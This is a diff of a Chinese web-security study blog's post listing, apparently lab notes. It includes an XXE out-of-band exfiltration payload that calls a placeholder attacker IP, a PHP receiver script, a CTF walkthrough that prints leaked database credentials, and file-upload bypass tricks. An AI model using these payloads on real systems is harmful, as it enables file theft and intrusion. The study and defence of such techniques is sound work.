@@ -126,13 +126,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">41</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -162,7 +162,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/SQL%E6%B3%A8%E5%85%A5-Header%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/30/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kilig.gif">
@@ -180,7 +180,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/11/16/SQL%E6%B3%A8%E5%85%A5-Header%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入-Header注入</a>
+          <a href="/2022/11/30/XXE-%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">XXE-外部实体注入攻击</a>
         </h2>
 
         <div class="post-meta-container">
@@ -191,14 +191,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-11-16 11:26:13" itemprop="dateCreated datePublished" datetime="2022-11-16T11:26:13+08:00">2022-11-16</time>
+      <time title="创建时间：2022-11-30 16:54:49" itemprop="dateCreated datePublished" datetime="2022-11-30T16:54:49+08:00">2022-11-30</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-03-07 21:28:30" itemprop="dateModified" datetime="2023-03-07T21:28:30+08:00">2023-03-07</time>
+      <time title="修改时间：2023-03-07 21:29:41" itemprop="dateModified" datetime="2023-03-07T21:29:41+08:00">2023-03-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -220,83 +220,648 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="SQL注入-Header注入"><a href="#SQL注入-Header注入" class="headerlink" title="SQL注入-Header注入"></a>SQL注入-Header注入</h1><hr>
-<h2 id="HEADER"><a href="#HEADER" class="headerlink" title="HEADER"></a>HEADER</h2><p>HTTP消息头是指，在超文本传输协议（ HTTP）的请求和响应消息中，协议头部分的那些组件</p>
-<p>HTTP Header内容的组织形式，大体分为Request和Response两部分</p>
-<p>HTTP消息头支持自定义</p>
-<blockquote>
-<p>在Requests部分中，几个常见参数</p>
-</blockquote>
+          <h1 id="XXE-外部实体注入攻击"><a href="#XXE-外部实体注入攻击" class="headerlink" title="XXE-外部实体注入攻击"></a>XXE-外部实体注入攻击</h1><hr>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE &#x3D;&#x3D;&gt;XML External Entity （XML外部实体）</p>
+<p><strong>原理</strong>：用户输入的数据被当做XML实体代码进行执行<br><strong>XXE&#x3D;&#x3D;&gt;用户输入的数据被当做XML代码进行了执行，然后利用DTD部分可以通过SYSTEM关键词发起网络请求从而获得数据</strong></p>
+<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>可扩展标记语言</p>
+<p>设计宗旨：传输数据，而非显示数据</p>
+<p>xml标签没有被预定义，需要自定义标签</p>
+<p><strong>特点</strong></p>
+<p>XML仅是存文本，不会执行任何事情</p>
+<p>XML可以自己发明标签（允许定义自己的标签和文档结构）</p>
+<p>XML是各种应用程序之间进行数据传输的最常见工具，并且在信息存储和描述领域变得越来越流行</p>
+<p>简单来说：XML就是存储数据的</p>
+<h2 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h2><p>DTD部分里面的一个特殊的地方（SYSTEM）可以调用外部文件进行XML文件的规划（发起网络请求）</p>
+<p>格式：****</p>
+<h2 id="PHP特殊函数"><a href="#PHP特殊函数" class="headerlink" title="PHP特殊函数"></a>PHP特殊函数</h2><p>在php中有一个特殊函数：simplexml_load_string()</p>
+<p>定义：simplexml_load_string(<em>data,classname,options,ns,is_prefix</em>);</p>
+<p>作用：simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>任意文件读取</p>
+<p>系统命令执行</p>
+<p>内网端口探测</p>
+<p>攻击内网网站</p>
+<p>……</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>很多时候后端语言解析了XML后并不会输出，故需要一个平台去接收数据<br>XML读取数据然后发送到接收的平台，然后接收平台存储</p>
+<p>XXE 攻击三步骤 &#x3D;&#x3D;&gt; 读取信息 信息外带 保存信息</p>
+<p>读取信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=敏感信息所在路径&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64加密读取的信息存放在file变量中</span><br></pre></td></tr></table></figure>
+
+<p>XXE可以发起网络请求<br>思路：<br>尝试将读取的信息存放在变量a（$a），然后发起请求，<a target="_blank" rel="noopener" href="http://x.x.x.x/1.php?id=$a">http://x.x.x.x/1.php?id=$a</a><br>自己的公网机器保存收到的传参</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">1.xml</span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://自己公网ip/xxe/2.php?id=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    &gt;</span></span></span><br><span class="line"><span class="language-xml">    %all;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">通过2.php文件 接收变量file的传参值</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">2.php代码：</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;3.txt&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>],FILE_APPEND);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">以GET方式接收id传入的值，并写入到3.txt</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://自己公网ip/xxe/1.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml">加载1.xml文件</span></span><br></pre></td></tr></table></figure>
+
+<p>只需要读取文件然后加载1.xml，1.xml会将读取文件的内容发送给2.php。2.php会储存到3.txt</p>
+<p>payload：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=敏感文件路径&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://自己公网ip/xxe/1.xml&quot;</span>&gt;</span>  </span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%remote;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">%send; </span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>使用开发语言提供的禁用外部实体的方法</p>
+<p>过滤用户提交的XML数据</p>
+<p>关键词：SYSTEM和PUBLIC</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察到是CMS搭建的<br><img src="https://img-blog.csdnimg.cn/20210407152722799.JPG" alt="在这里插入图片描述"></p>
+<p>2、下载与靶场相同的CMS，导入源码到seay，进行代码审计</p>
+<p>3、定位simplexml_load_string函数</p>
+<p>4、打开weixin文件夹下的idnex.php<br><img src="https://img-blog.csdnimg.cn/20210407152739849.JPG" alt="在这里插入图片描述"></p>
+<p>4、代码分析：<br><img src="https://img-blog.csdnimg.cn/20210407152809524.JPG" alt="在这里插入图片描述"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">simplexml_load_string</span><span class="params">(<span class="variable">$postArr</span>)</span></span>==&gt;将变量postArr转换为对象</span><br><span class="line">&amp;postArr 是一个XML字符串</span><br><span class="line"><span class="variable">$postArr</span> = <span class="built_in">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>)</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span>==&gt;整个文件读入在一个字符串中</span><br><span class="line">php:<span class="comment">//input==&gt;PHP伪协议，只能在php内部使用；</span></span><br><span class="line">可以访问请求的原始数据的只读流</span><br></pre></td></tr></table></figure>
+
+<p>往上溯源<br><img src="https://img-blog.csdnimg.cn/20210407152845135.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>第一个if<br>if ($echostr !&#x3D; “”)&#x3D;&#x3D;&gt;如果echostr变量不等于空才会执行这个分支</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要使得第二个if分支执行，那么echostr变量等于空</span><br></pre></td></tr></table></figure>
+
+<p>第二个if<br>if ($signature !&#x3D; “” &amp;&amp; $echostrechostr “”)<br>&gt;signature变量不等于空 并且 echostr等于空 才会执行该if分支</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$signature = $_REQUEST[<span class="string">&quot;signature&quot;</span>]<span class="comment">;</span></span><br><span class="line">$echostr = $_REQUEST[<span class="string">&quot;echostr&quot;</span>]</span><br><span class="line"></span><br><span class="line">故可通过传参控制$signature和$echostr</span><br></pre></td></tr></table></figure>
+
+<p>5、观察发现该cms的敏感文件位于conn文件夹下的conn.php<br>该文件中存放了数据库的用户名、密码、数据库名<br>读取信息 payload：</p>
+<p>6、访问靶场下的weixin页面<br><img src="https://img-blog.csdnimg.cn/20210407152943336.png" alt="在这里插入图片描述"></p>
+<p>7、抓包，传参<br>传参：?signature&#x3D;1&amp;echostr&#x3D;<br>写入数据：<br>?xml version&#x3D;”1.0”?&gt;</p>
+<p>%remote;<br>%send;<br>]&gt;<br><img src="https://img-blog.csdnimg.cn/20210407153219803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>8、传参被检测<br>检测传参 一般只针对$_POST、$_GET、$_REQUEST、$_COOKIE<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>类型为表单<br>因为是表单，所以才会被POST&#x2F;GET….接收，故删除Content-Type即可<br><img src="https://img-blog.csdnimg.cn/20210407153323676.png" alt="在这里插入图片描述"><br>发送成功</p>
+<p>9、访问3.txt，获得信息，进行解码得到<br>$conn &#x3D; mysqli_connect(“192.168.0.10”,”xxe”, “teiwo!8#7ERe1DPC”, “scms”);<br>用户名：xxe<br>密码：teiwo!8#7ERe1DPC<br>数据库名：scms</p>
+<p>10、通过目录扫描知道有adminer.php，进行访问<br><img src="https://img-blog.csdnimg.cn/20210407153358922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>登录获取的账号密码数据库名<br><img src="https://img-blog.csdnimg.cn/20210407153416676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>11、通过执行 select * from SL_admin<br>得到SL_admin表的所有信息<br><img src="https://img-blog.csdnimg.cn/20210407153432584.png" alt="在这里插入图片描述"></p>
+<p>12、通过提示信息得知flag为管理员的密码<br>故将admin的A_pwd字段进行md5解码<br><img src="https://img-blog.csdnimg.cn/20210407153444773.JPG" alt="在这里插入图片描述"></p>
+<p>13、通关<br><img src="https://img-blog.csdnimg.cn/20210407153454539.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-29 11:34:17" itemprop="dateCreated datePublished" datetime="2022-11-29T11:34:17+08:00">2022-11-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:30:14" itemprop="dateModified" datetime="2023-03-07T21:30:14+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><hr>
+<h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><p>大部分的网站和应用系统都有上传功能，而程序员在开发文件上传功能时，没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能。上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，通过访问这些恶意脚本中代码，进一步影响服务器安全。</p>
+<h1 id="文件上传检测方法"><a href="#文件上传检测方法" class="headerlink" title="文件上传检测方法"></a>文件上传检测方法</h1><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>一般是在网页中写一段JS脚本，用JS去检测，校验上传文件名的后缀名，有白名单和黑名单</p>
+<p><strong>判断方法：</strong></p>
+<p>在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg&#x2F;.jpeg&#x2F;.png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来 判断，如果弹出不准上传，但是没有抓到数据包，那么就是前端验证</p>
+<p><strong>注意：</strong>前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过</p>
+<h2 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h2><p>常见手段：</p>
+<p>检查Content-Type（内容类型）</p>
+<p>检查后缀（检查后缀是主流）</p>
+<p>检查文件名头</p>
+<h1 id="文件上传程流程"><a href="#文件上传程流程" class="headerlink" title="文件上传程流程"></a>文件上传程流程</h1><p><strong>文件上传流程：</strong></p>
+<p>网页上传 -&gt; 目标服务器的缓存 -&gt; 移动到开发写好的地址 -&gt; 重命名（开发决定命名方式）</p>
+<p>1、先上传后检测</p>
+<p>2、先检测后上传</p>
+<h1 id="文件上传绕过方法"><a href="#文件上传绕过方法" class="headerlink" title="文件上传绕过方法"></a>文件上传绕过方法</h1><h2 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title="前端验证绕过"></a>前端验证绕过</h2><h2 id="Content-Type方式绕过"><a href="#Content-Type方式绕过" class="headerlink" title="Content-Type方式绕过"></a>Content-Type方式绕过</h2><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>利用php、asp等脚本的别名绕过</p>
+<p>.htaccess文件绕过</p>
+<p>大小写绕过</p>
+<p>文件后缀（空）绕过</p>
+<p>文件后缀（点）饶过【windows有一个特性，会自动去掉后缀名最后的】</p>
+<p>::$DATA（Windows文件流绕过）【利用windows特性，可在后缀名中加” ::$DATA”绕过】</p>
+<p>构造文件后缀绕过</p>
+<p>双写饶过</p>
+<h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>%00截断（GET型和POST型）</p>
+<p>图片马（配合解析漏洞）</p>
+<p>二次渲染饶过</p>
+<p>条件竞争</p>
+<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>Windows自带的中间件：</p>
+<ul>
+<li>Windows server 2003 &#x3D;&#x3D;&gt;IIS6.0</li>
+<li>Windows server 2008 &#x3D;&#x3D;&gt;IIS7.0-7.5</li>
+<li>注意：有些网站是混合的，既可以上传PHP又可以上传ASP</li>
+</ul>
+<h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><p>1、</p>
+<p>IIS6.0&gt;1.asp;.jpg&gt;00截断的变形</p>
+<p>检测时会以最后一个.去判断，为jpg</p>
+<p>中间件解析时会以.asp解析</p>
+<p>将aspshell.jpg重命名为shell.asp;1.jpg进行上传</p>
+<p>2、</p>
+<p>a.asp&#x2F;123.jpg&#x3D;&#x3D;&gt;会不会是个目录？</p>
+<p>当中间件IIS6.0遇到a.asp&#x2F; 时 会把a.asp&#x2F; 下的所有内容当作asp文件执行</p>
+<p>asp站点 IIS6.0</p>
+<p>一般来说aspx的站点会兼容asp</p>
+<h2 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h2><p>PHP和中间件Nginx交互时，会在本地开一个9000端口，PHP和Nginx通信全走9000端口</p>
+<p>例如：<br><a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php">www.xx.com/phpinfo.jpg/1.php</a></p>
+<p>当中间件访问1.php 会认为它是一个PHP文件，当1.php不存在时，会自动跳转至上一级phpinfo.jpg，会把phpinfo.jpg误当作php文件去执行</p>
+<h1 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p><strong>不在前端使用JS限制策略</strong></p>
+<h2 id="通过服务端对上传文件进行限制"><a href="#通过服务端对上传文件进行限制" class="headerlink" title="通过服务端对上传文件进行限制"></a>通过服务端对上传文件进行限制</h2><p>进行多条件组合检查：如文件的大小、路径、扩展名、文件类型、文件完整性</p>
+<p>对上传的文件在服务器上存储时进行重命名</p>
+<p>对服务端上传文件的目录进行权限控制，限制执行权限带来的危害</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/28/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/28/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="post-title-link" itemprop="url">SSRF-服务器端请求伪造</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-28 19:33:23" itemprop="dateCreated datePublished" datetime="2022-11-28T19:33:23+08:00">2022-11-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 21:29:32" itemprop="dateModified" datetime="2023-03-07T21:29:32+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF-服务器端请求伪造"></a>SSRF-服务器端请求伪造</h1><hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞</p>
+<p>利用一个可发起网络请求的服务器当作跳板来攻击其他服务</p>
+<h2 id="SSRF形成原因"><a href="#SSRF形成原因" class="headerlink" title="SSRF形成原因"></a>SSRF形成原因</h2><p>服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤与限制</p>
+<h2 id="SSRF能做什么"><a href="#SSRF能做什么" class="headerlink" title="SSRF能做什么"></a>SSRF能做什么</h2><p>扫描内部网络</p>
+<p>向内部任意主机的任意端口 发送 精心构造的数据包（payload ）</p>
+<p>DOS</p>
+<p>暴力枚举</p>
+<p>……</p>
+<p>网站的安全性：外紧内松（外部防御很严格，内部比较松散）</p>
+<h2 id="怎么找SSRF"><a href="#怎么找SSRF" class="headerlink" title="怎么找SSRF"></a>怎么找SSRF</h2><p>传参出现：协议头（http:&#x2F;&#x2F;）、文件名（a&#x3D;index.php）、传参出现后缀的时候</p>
+<p>传参：<a target="_blank" rel="noopener" href="http://www.baidu.com/s?wd=ip">http://www.baidu.com/s?wd=ip</a></p>
+<h2 id="产生漏洞PHP函数"><a href="#产生漏洞PHP函数" class="headerlink" title="产生漏洞PHP函数"></a>产生漏洞PHP函数</h2><p>file_get_content()</p>
+<p>fsockopen()</p>
+<p>curl_exec()</p>
+<p>注意：SSRF攻击可能存在任何语言编写的应用</p>
+<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>过滤：过滤127.0.0.1，内网地址不允许访问</p>
+<p>强制跳转</p>
+<p><strong>注意：过滤掉了127.0.0.1仍然不安全，可以DNS绕过， 将DNS的地址指向127.0.0.1</strong></p>
+<h2 id="SSRF-x2F-CSRF-x2F-XSS区别"><a href="#SSRF-x2F-CSRF-x2F-XSS区别" class="headerlink" title="SSRF&#x2F;CSRF&#x2F;XSS区别"></a>SSRF&#x2F;CSRF&#x2F;XSS区别</h2><p>CSRF: 跨站请求伪造，利用cookie，在浏览器上执行</p>
+<p>XSS:跨站脚本攻击，获取cookie，在浏览器上执行</p>
+<p>SSRF:服务器端请求伪造，在服务端上头执行</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kilig.gif">
+      <meta itemprop="name" content="kiligwh">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kilig's Blog">
+      <meta itemprop="description" content="欢迎">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | kilig's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/11/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="post-title-link" itemprop="url">CSRF-跨站请求伪造</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-28 15:44:40" itemprop="dateCreated datePublished" datetime="2022-11-28T15:44:40+08:00">2022-11-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-03-07 18:56:49" itemprop="dateModified" datetime="2023-03-07T18:56:49+08:00">2023-03-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
